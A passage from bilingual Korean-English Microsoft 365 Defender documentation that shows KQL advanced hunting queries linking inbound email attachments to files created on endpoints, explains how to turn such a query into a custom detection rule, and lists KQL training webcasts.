   <span data-ttu-id="eb80f-336">결과 테이블에는 이제 끝점(끝점용 Microsoft Defender)의 세부 정보(예: 장치 이름, 수행된 작업(이 경우 FileCreated 이벤트만 포함) 및 파일이 저장된 위치가 포함됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="eb80f-337">프로세스와 연결된 계정 이름도 포함됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="eb80f-338">이제 사용자가 첨부 파일을 열거나 저장한 모든 인바운드 전자 메일을 식별하는 쿼리를 만들 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="eb80f-339">이 쿼리를 구체화하여 특정 보낸 사람 도메인, 파일 크기, 파일 형식 등도 필터링할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7. <span data-ttu-id="eb80f-340">함수는 특수한 종류의 조인으로, 파일에 대한 추가 TI 데이터(예: 보급, 서명자 및 발급자 정보 등)를 끌어와야 합니다. 파일에 대한 자세한 내용을 확인하기 위해 **FileProfile()** 함수 향상을 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="eb80f-341">검색 만들기</span><span class="sxs-lookup"><span data-stu-id="eb80f-341">Create a detection</span></span>

<span data-ttu-id="eb80f-342">향후 경고를 받을 정보를 식별하는 쿼리를 만든  후 쿼리에서 사용자 지정 검색을 만들 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

<span data-ttu-id="eb80f-343">사용자 지정 검색은 설정한 빈도에 따라 쿼리를 실행하고 쿼리 결과에 따라 선택한 영향을 미치는 자산에 따라 보안 경고가 생성됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="eb80f-344">이러한 경고는 인시던트와 상호 관련이 있으며 제품 중 하나에서 생성된 다른 보안 경고로 조사될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="eb80f-345">쿼리 페이지에서 이동 헌팅 지침의 7단계에서 추가된 줄 7과 8을 제거하고 검색 규칙 **만들기를 클릭합니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![고급 헌팅 페이지에서 검색 규칙 만들기를 클릭할 수 있는 위치 스크린샷](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="eb80f-347">검색 규칙 **만들기를** 클릭하고 쿼리에 구문 오류가 있는 경우 검색 규칙이 저장되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="eb80f-348">쿼리를 다시 확인하여 오류가 없는지 검사합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="eb80f-349">보안 팀에서 경고를 이해할 수 있는 정보, 경고가 생성된 이유 및 수행할 것으로 예상되는 작업을 파악하는 데 필요한 필드를 입력합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

   ![경고 세부 정보를 정의할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig23.png)

   <span data-ttu-id="eb80f-351">이 검색 규칙 경고에 대한 정보를 통해 다음 사용자에게 정보를 제공하도록 필드를 명확히 작성해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="eb80f-352">이 경고에 영향을 미치는 엔터티를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="eb80f-353">이 경우 장치 및 **사서함 을** **선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![영향을 미치는 엔터티의 매개 변수를 선택할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig24.png)

4. <span data-ttu-id="eb80f-355">경고가 트리거되는 경우 수행할 작업을 결정 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="eb80f-356">이 경우 다른 작업을 수행할 수 있는 경우에도 바이러스 백신 검색을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![위협을 해결하기 위해 경고가 트리거될 때 바이러스 백신 검색을 실행할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig25.png)

5. <span data-ttu-id="eb80f-358">경고 규칙의 범위를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="eb80f-359">이 쿼리는 장치를 포함하기 때문에 장치 그룹은 끝점 컨텍스트에 대한 Microsoft Defender에 따라 이 사용자 지정 검색과 관련이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="eb80f-360">영향을 미치는 엔터티로 장치를 포함하지 않는 사용자 지정 검색을 만드는 경우 범위가 적용되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![경고 규칙의 범위를 설정할 수 있는 검색 규칙 만들기 페이지의 스크린샷은 결과에 대한 기대치를 관리합니다.](../../media/mtp/fig26.png)

   <span data-ttu-id="eb80f-362">이 파일럿에서는 이 규칙을 프로덕션 환경의 테스트 장치 하위 집합으로 제한할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="eb80f-363">**만들기** 를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-363">Select **Create**.</span></span> <span data-ttu-id="eb80f-364">그런 다음 탐색 **패널에서 사용자** 지정 검색 규칙을 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![메뉴의 사용자 지정 검색 규칙 옵션 스크린샷](../../media/mtp/fig27a.png)

   ![규칙 및 실행 세부 정보를 표시하는 검색 규칙 페이지의 스크린샷](../../media/mtp/fig27b.png)

   <span data-ttu-id="eb80f-367">이 페이지에서 세부 정보 페이지를 여는 검색 규칙을 선택할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![규칙 실행, 트리거된 경고 및 작업, 검색 편집 등 상태를 확인할 수 있는 전자 메일 첨부 파일 페이지의 스크린샷](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="eb80f-369">추가 고급 헌팅 연습</span><span class="sxs-lookup"><span data-stu-id="eb80f-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="eb80f-370">고급 헌팅에 대한 자세한 내용을 알아보기 위해 다음 웹캐스트에서는 Microsoft 365 Defender 내에서 고급 헌팅 기능을 통해 상호 기반 쿼리를 만들고 엔터티에 피벗하고 사용자 지정 검색 및 수정 작업을 만드는 방법을 제공합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-371">파일럿 테스트 랩 환경에서 헌팅 쿼리를 실행할 수 있도록 자체 GitHub 계정으로 준비하세요.</span><span class="sxs-lookup"><span data-stu-id="eb80f-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

|<span data-ttu-id="eb80f-372">제목</span><span class="sxs-lookup"><span data-stu-id="eb80f-372">Title</span></span>|<span data-ttu-id="eb80f-373">설명</span><span class="sxs-lookup"><span data-stu-id="eb80f-373">Description</span></span>|<span data-ttu-id="eb80f-374">MP4 다운로드</span><span class="sxs-lookup"><span data-stu-id="eb80f-374">Download MP4</span></span>|<span data-ttu-id="eb80f-375">YouTube에서 시청</span><span class="sxs-lookup"><span data-stu-id="eb80f-375">Watch on YouTube</span></span>|<span data-ttu-id="eb80f-376">사용할 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="eb80f-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="eb80f-377">에피소드 1: KQL 기본 사항</span><span class="sxs-lookup"><span data-stu-id="eb80f-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="eb80f-378">Microsoft 365 Defender의 고급 헌팅 기능의 기본에 대해 다를 것입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="eb80f-379">사용 가능한 고급 헌팅 데이터와 기본 KQL 구문 및 연산자에 대해 자세히 알아보습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="eb80f-380">MP4</span><span class="sxs-lookup"><span data-stu-id="eb80f-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="eb80f-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="eb80f-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="eb80f-382">에피소드 1: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="eb80f-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="eb80f-383">에피소드 2: 참가</span><span class="sxs-lookup"><span data-stu-id="eb80f-383">Episode 2: Joins</span></span>|<span data-ttu-id="eb80f-384">고급 헌팅의 데이터와 테이블을 함께 조인하는 방법에 대해 계속 학습할 것입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="eb80f-385">내부, 외부, 고유 및 세미 조인과 기본 Kusto 내부 유니크 조인의 미주에 대해 자세히 알아보습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="eb80f-386">MP4</span><span class="sxs-lookup"><span data-stu-id="eb80f-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="eb80f-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="eb80f-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="eb80f-388">에피소드 2: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="eb80f-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="eb80f-389">에피소드 3: 데이터 요약, 피벗 및 시각화</span><span class="sxs-lookup"><span data-stu-id="eb80f-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="eb80f-390">이제 데이터를 필터링, 조작 및 조인할 수 있습니다. 이제 요약, 수량화, 피벗 및 시각화를 시작할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="eb80f-391">이 에피소드에서는 고급 헌팅 계획의 추가 테이블로 나들이하는 동안 수행할 수 있는 계산과 요약 연산자에 대해 다루게 됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="eb80f-392">데이터 집합을 분석을 개선하는 데 도움이 되는 차트로 전환합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="eb80f-393">MP4</span><span class="sxs-lookup"><span data-stu-id="eb80f-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="eb80f-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="eb80f-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="eb80f-395">에피소드 3: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="eb80f-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="eb80f-396">에피소드 4: 헌트해보시고요!</span><span class="sxs-lookup"><span data-stu-id="eb80f-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="eb80f-397">인시던트 추적에 KQL 적용</span><span class="sxs-lookup"><span data-stu-id="eb80f-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="eb80f-398">일부 공격자 활동을 추적하는 시간입니다!</span><span class="sxs-lookup"><span data-stu-id="eb80f-398">Time to track some attacker activity!</span></span> <span data-ttu-id="eb80f-399">이 에피소드에서는 Microsoft 365 Defender의 KQL 및 고급 헌팅에 대한 향상된 이해를 사용하여 공격을 추적합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="eb80f-400">사이버 보안 ABC를 포함하여 공격자 활동을 추적하는 데 사용되는 몇 가지 팁과 트릭과 인시던트 대응에 적용하는 방법을 알아보십시오.</span><span class="sxs-lookup"><span data-stu-id="eb80f-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="eb80f-401">MP4</span><span class="sxs-lookup"><span data-stu-id="eb80f-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="eb80f-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="eb80f-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="eb80f-403">에피소드 4: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="eb80f-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="eb80f-404">다음 단계</span><span class="sxs-lookup"><span data-stu-id="eb80f-404">Next step</span></span>

|<span data-ttu-id="eb80f-405">![닫기 및 요약 단계](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="eb80f-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="eb80f-406">닫기 및 요약 단계</span><span class="sxs-lookup"><span data-stu-id="eb80f-406">Closing and summary phase</span></span>](m365d-pilot-close.md)|<span data-ttu-id="eb80f-407">Microsoft 365 Defender 파일럿 결과를 분석하여 이해 관계자에게 제시하고 다음 단계를 진행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
